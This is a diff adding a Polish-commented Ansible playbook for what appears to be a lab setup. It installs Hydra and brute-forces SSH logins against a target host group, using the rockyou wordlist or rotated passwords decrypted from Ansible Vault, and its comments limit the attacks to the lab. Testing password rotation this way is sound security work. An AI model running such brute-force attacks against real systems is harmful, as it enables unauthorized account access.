@@ -1,0 +1,370 @@
+﻿---
+- name: Konfiguracja Scannera i atak Hydra
+  hosts: scanner_servers
+  become: true
+  gather_facts: false
+
+  vars:
+    hydra_target_group: blue_group
+    user_to_attack: "ansible"
+
+    hydra_version: "{{ package_versions_effective['hydra'] }}"
+    gzip_version: "{{ package_versions_effective['gzip'] }}"
+    wordlists_version: "{{ package_versions_effective['wordlists'] }}"
+
+    get_from_nmap: true
+    hydra_input_file: "{{ playbook_dir }}/input/nmap/hydra_input.json"
+
+    get_rotated_passwords: true
+    rotated_password_var: "rotated_{{ user_to_attack }}_password"
+    rotated_password_dir: "{{ playbook_dir }}/../inventories/host_vars"
+    generated_vault_pass_file: "{{ playbook_dir }}/../inventories/.vault_passwords/generated_admin_secrets.pass"
+
+    ssh_port: 2228
+    rockyou_path: "/usr/share/wordlists/rockyou.txt"       # Standardowy slownik hasel, ktore wyciekly
+    rocktest_path: "/usr/share/wordlists/rocktest.txt"     # Slownik hasel skladajacy sie z hasel utworzonych w trakcie uruchomienia playbooka do rotacji hasel
+
+    output_dir: "/tmp/hydra_results"
+    hydra_report_root: "{{ playbook_dir }}/../reports/hydra"
+
+  pre_tasks:
+    # Cele moga pochodzic z pliku wynikowego Nmap na kontrolerze albo z
+    # inventory. Przy wlaczonym odczycie hasel Vault wymagane sa odpowiednie
+    # sekrety i plik hasla Vault na kontrolerze.
+    # Assert sprawi, ze playbook zostanie przerwany jesli grupa nie jestnieje lub nie zostala wpisana do inputu.
+    - name: Sprawdzenie, czy grupa docelowa istnieje w inventory
+      ansible.builtin.assert:
+        that:
+          - hydra_target_group in groups
+          - groups[hydra_target_group] | length > 0
+        fail_msg: "Grupa '{{ hydra_target_group }}' nie istnieje albo nie zawiera hostow."
+
+    # Batch id umozliwia odroznienie konkretnych uruchomien playbookow Ansible
+    - name: Ustawienie batch id na masterze ansible
+      ansible.builtin.set_fact:
+        hydra_batch_id: "{{ lookup('pipe', 'date +%Y%m%d_%H%M%S') }}"
+      delegate_to: localhost
+      delegate_facts: true
+      run_once: true
+      become: false
+
+    - name: Utworzenie katalogu raportow na localhost
+      ansible.builtin.file:
+        path: "{{ hydra_report_root }}/{{ hostvars['localhost']['hydra_batch_id'] }}"
+        state: directory
+        mode: "0700"
+      delegate_to: localhost
+      run_once: true
+      become: false
+
+    - name: Sprawdzenie, czy istnieje plik wejscia Hydry z Nmap
+      ansible.builtin.stat:
+        path: "{{ hydra_input_file }}"
+      register: hydra_input_stat
+      delegate_to: localhost
+      run_once: true
+      become: false
+
+    - name: Wczytanie pliku wejscia Hydry z Nmap
+      ansible.builtin.slurp:
+        src: "{{ hydra_input_file }}"
+      register: hydra_input_raw
+      delegate_to: localhost
+      run_once: true
+      become: false
+      when:
+        - get_from_nmap | bool
+        - hydra_input_stat.stat.exists
+
+    - name: Przygotowanie pustej listy targetow Hydry
+      ansible.builtin.set_fact:
+        hydra_targets: []
+
+    - name: Uzycie targetow Hydry z inputu Nmap
+      ansible.builtin.set_fact:
+        hydra_targets: "{{ (hydra_input_raw.content | b64decode | from_json).targets | default([]) }}"
+      when:
+        - get_from_nmap | bool
+        - hydra_input_stat.stat.exists
+
+    # Targety Hydry budowane z inventory, gdy flaga get_from_nmap ustawiona
+    # jest jako false lub brakuje pliku z inputem dla Hydry z Nmapa.
+    - name: Zbudowanie targetow Hydry z inventory
+      ansible.builtin.set_fact:
+        hydra_targets: "{{ hydra_targets + [hydra_inventory_target] }}"
+      vars:
+        hydra_inventory_target:
+          host: "{{ hostvars[item].ansible_host }}"
+          port: "{{ ssh_port }}"
+          protocol: ssh
+      loop: "{{ groups[hydra_target_group] }}"
+      when: not ((get_from_nmap | bool) and hydra_input_stat.stat.exists)
+
+    - name: Sprawdzenie, czy lista targetow nie jest pusta
+      ansible.builtin.assert:
+        that:
+          - hydra_targets | length > 0
+        fail_msg: "Nie udalo sie zbudowac listy targetow dla Hydry."
+
+    - name: Pokazanie targetow Hydra
+      ansible.builtin.debug:
+        msg: "{{ hydra_targets }}"
+
+    - name: Sprawdzenie, czy pliki hasel po rotacji istnieja
+      ansible.builtin.stat:
+        path: "{{ rotated_password_dir }}/{{ item }}/secrets.pass"
+      register: rotated_password_files
+      loop: "{{ groups[hydra_target_group] }}"
+      delegate_to: localhost
+      become: false
+      when: get_rotated_passwords | bool
+      no_log: true
+    
+    # Plik hasla vault umozliwia ogladanie secrets.pass
+    - name: Sprawdzenie, czy plik hasla Vault istnieje
+      ansible.builtin.stat:
+        path: "{{ generated_vault_pass_file }}"
+      register: generated_vault_pass_file_stat
+      delegate_to: localhost
+      run_once: true
+      become: false
+      when: get_rotated_passwords | bool
+
+    - name: Blad - brak pliku hasla Vault
+      ansible.builtin.assert:
+        that:
+          - generated_vault_pass_file_stat.stat.exists
+        fail_msg: "Brak {{ generated_vault_pass_file }}. Uruchom rotate_passwords.yml albo wskaz poprawny generated_vault_pass_file."
+      run_once: true
+      when: get_rotated_passwords | bool
+
+    - name: Blad - brak pliku hasla po rotacji
+      ansible.builtin.assert:
+        that:
+          - item.stat.exists
+        fail_msg: "Brak {{ rotated_password_dir }}/{{ item.item }}/secrets.pass. Uruchom rotate_passwords.yml."
+      loop: "{{ rotated_password_files.results | default([]) }}"
+      when: get_rotated_passwords | bool
+
+    - name: Odczytanie hasel z rotate_password przez ansible-vault
+      ansible.builtin.command:
+        argv:
+          - ansible-vault
+          - view
+          - "{{ rotated_password_dir }}/{{ item }}/secrets.pass"
+          - "--vault-password-file"
+          - "{{ generated_vault_pass_file }}"
+      loop: "{{ groups[hydra_target_group] }}"
+      register: rotated_password_vars
+      delegate_to: localhost
+      become: false
+      changed_when: false
+      when: get_rotated_passwords | bool
+      no_log: true
+
+    - name: Przygotowanie pustej listy hasel dla Hydry
+      ansible.builtin.set_fact:
+        hydra_rotated_passwords: []
+      when: get_rotated_passwords | bool
+      no_log: true
+
+    - name: Zbudowanie listy hasel dla Hydry
+      ansible.builtin.set_fact:
+        hydra_rotated_passwords: "{{ hydra_rotated_passwords + [(item.stdout | from_yaml)[rotated_password_var]] }}"
+      loop: "{{ rotated_password_vars.results | default([]) }}"
+      when: get_rotated_passwords | bool
+      no_log: true
+
+  tasks:
+    - block:
+        - name: Sprawdz zainstalowane wersje pakietow Hydry
+          ansible.builtin.command:
+            argv:
+              - dpkg-query
+              - -W
+              - -f=${Version}
+              - "{{ item.split('=')[0] }}"
+          loop:
+            - "hydra={{ hydra_version }}"
+            - "gzip={{ gzip_version }}"
+            - "wordlists={{ wordlists_version }}"
+          register: package_guard_versions
+          changed_when: false
+          failed_when: false
+
+        - name: Instalacja i uruchomienie Hydry z pelnym cyklem hold
+          block:
+            - name: Zdejmij blokade hold dla pakietow wymagajacych zmiany
+              ansible.builtin.include_tasks: tasks/package_guard_unhold.yml
+              vars:
+                package_guard_packages:
+                  - "hydra={{ hydra_version }}"
+                  - "gzip={{ gzip_version }}"
+                  - "wordlists={{ wordlists_version }}"
+
+            # gzip w celu
+            - name: Instalacja Hydry i narzedzi pomocniczych
+              ansible.builtin.include_tasks: tasks/package_guard_apt.yml
+              vars:
+                package_guard_packages:
+                  - "hydra={{ hydra_version }}"
+                  - "gzip={{ gzip_version }}"
+                  - "wordlists={{ wordlists_version }}"
+                package_guard_apt_update_cache: true
+                package_guard_apt_retries: 5
+                package_guard_apt_delay: 10
+
+            - name: Utworzenie pliku rocktest.txt z haslami z rotate_password
+              ansible.builtin.copy:
+                dest: "{{ rocktest_path }}"
+                content: "{{ hydra_rotated_passwords | default([]) | join('\n') }}\n"
+                owner: root
+                group: root
+                mode: "{{ permission_baseline_scanner | selectattr('path','equalto', rocktest_path) | map(attribute='mode') | list | first | default('0644') }}"
+              when: get_rotated_passwords | bool
+              no_log: true
+
+            - name: Sprawdzenie, czy istnieje rockyou.txt i usuniecie w trybie pelnym
+              ansible.builtin.file:
+                path: "{{ rockyou_path }}"
+                state: absent
+              when: not (get_rotated_passwords | bool)
+
+            - name: Sprawdzenie, czy istnieje skompresowany rockyou.txt.gz
+              ansible.builtin.stat:
+                path: "{{ rockyou_path }}.gz"
+              register: rockyou_gz_stat
+
+            - name: Wypakowanie rockyou.txt, jesli istnieje wersja .gz
+              ansible.builtin.command:
+                argv:
+                  - gunzip
+                  - -k
+                  - "{{ rockyou_path }}.gz"
+              when:
+                - rockyou_gz_stat.stat.exists
+                - not (get_rotated_passwords | bool)
+              changed_when: true
+              failed_when: false
+
+            - name: Sprawdzenie dostepnosci slownika rockyou
+              ansible.builtin.stat:
+                path: "{{ rockyou_path }}"
+              register: rockyou_stat
+              when: not (get_rotated_passwords | bool)
+
+            - name: Sprawdzenie dostepnosci slownika rocktest
+              ansible.builtin.stat:
+                path: "{{ rocktest_path }}"
+              register: rocktest_stat
+              when: get_rotated_passwords | bool
+
+            - name: Blad - brak rockyou.txt
+              ansible.builtin.fail:
+                msg: "Plik {{ rockyou_path }} nie istnieje. Sprawdz pakiet wordlists albo wypakuj rockyou.txt.gz."
+              when: >-
+                not (get_rotated_passwords | bool) and
+                not (rockyou_stat.stat.exists | default(false))
+
+            - name: Blad - brak rocktest.txt
+              ansible.builtin.fail:
+                msg: "Plik {{ rocktest_path }} nie istnieje."
+              when: >-
+                get_rotated_passwords | bool and
+                not (rocktest_stat.stat.exists | default(false))
+
+            - name: Tworzenie folderu na wyniki
+              ansible.builtin.file:
+                path: "{{ output_dir }}"
+                state: directory
+                mode: "0755"
+
+            # Skaner wykonuje testy SSH na wybranych celach. Wyniki sa nastepnie
+            # pobierane na kontroler. Ataki uruchamiac tylko w laboratorium.
+            - name: Uruchomienie Hydry na SSH z rockyou
+              ansible.builtin.command:
+                argv:
+                  - hydra
+                  - -s
+                  - "{{ item.port | string }}"
+                  - -l
+                  - "{{ user_to_attack }}"
+                  - -P
+                  - "{{ rockyou_path }}"
+                  - -t
+                  - "4"
+                  - -f
+                  - -V
+                  - "{{ item.host }}"
+                  - "{{ item.protocol | default('ssh') }}"
+                  - -o
+                  - "{{ output_dir }}/hydra_{{ item.host }}_{{ item.port }}_{{ hostvars['localhost']['hydra_batch_id'] }}.txt"
+              loop: "{{ hydra_targets }}"
+              register: hydra_run_rockyou
+              async: 7200
+              poll: 15
+              # false, zeby falszywie nie wplywac na test idempotentnosci.
+              # W rzeczywistosci za kazdym razem jest tworzony nowy raport.
+              changed_when: false
+              failed_when: false
+              when: not (get_rotated_passwords | bool)
+
+            - name: Uruchomienie Hydry na SSH z haslami po rotacji
+              ansible.builtin.command:
+                argv:
+                  - hydra
+                  - -s
+                  - "{{ item.port | string }}"
+                  - -l
+                  - "{{ user_to_attack }}"
+                  - -P
+                  - "{{ rocktest_path }}"
+                  - -t
+                  - "4"
+                  - -f
+                  - -V
+                  - "{{ item.host }}"
+                  - "{{ item.protocol | default('ssh') }}"
+                  - -o
+                  - "{{ output_dir }}/hydra_{{ item.host }}_{{ item.port }}_{{ hostvars['localhost']['hydra_batch_id'] }}.txt"
+              loop: "{{ hydra_targets }}"
+              register: hydra_run_rotated
+              async: 7200
+              poll: 15
+              # false, zeby falszywie nie wplywac na test idempotentnosci.
+              # W rzeczywistosci za kazdym razem jest tworzony nowy raport.
+              changed_when: false
+              failed_when: false
+              when: get_rotated_passwords | bool
+
+            - name: Pobranie raportow Hydry na master Ansible
+              # changed dopuszczalny - to pobranie nowego pliku raportu z batch_id, wiec zawsze bedzie nowy plik
+              ansible.builtin.fetch:
+                src: "{{ output_dir }}/hydra_{{ item.host }}_{{ item.port }}_{{ hostvars['localhost']['hydra_batch_id'] }}.txt"
+                dest: "{{ hydra_report_root }}/{{ hostvars['localhost']['hydra_batch_id'] }}/"
+                flat: true
+              loop: "{{ hydra_targets }}"
+              ignore_errors: true
+          always:
+            - name: Ustaw blokade hold dla pakietow
+              ansible.builtin.include_tasks: tasks/package_guard_hold.yml
+              vars:
+                package_guard_packages:
+                  - "hydra={{ hydra_version }}"
+                  - "gzip={{ gzip_version }}"
+                  - "wordlists={{ wordlists_version }}"
+
+        - name: Wyniki Hydry
+          ansible.builtin.debug:
+            msg: "Wynik dla {{ item.host }}:{{ item.port }} zapisany w {{ output_dir }}/hydra_{{ item.host }}_{{ item.port }}_{{ hostvars['localhost']['hydra_batch_id'] }}.txt"
+          loop: "{{ hydra_targets }}"
+
+      rescue:
+        - name: Dolacz wspolna obsluge bledu
+          ansible.builtin.include_tasks: tasks/rescue_report_failure.yml
+
+      always:
+        - name: Dolacz wspolne taski etckeeper
+          ansible.builtin.include_tasks: tasks/commit_etckeeper.yml
+          vars:
+            etckeeper_commit_message: "Ansible: install_hydra_or_attack"
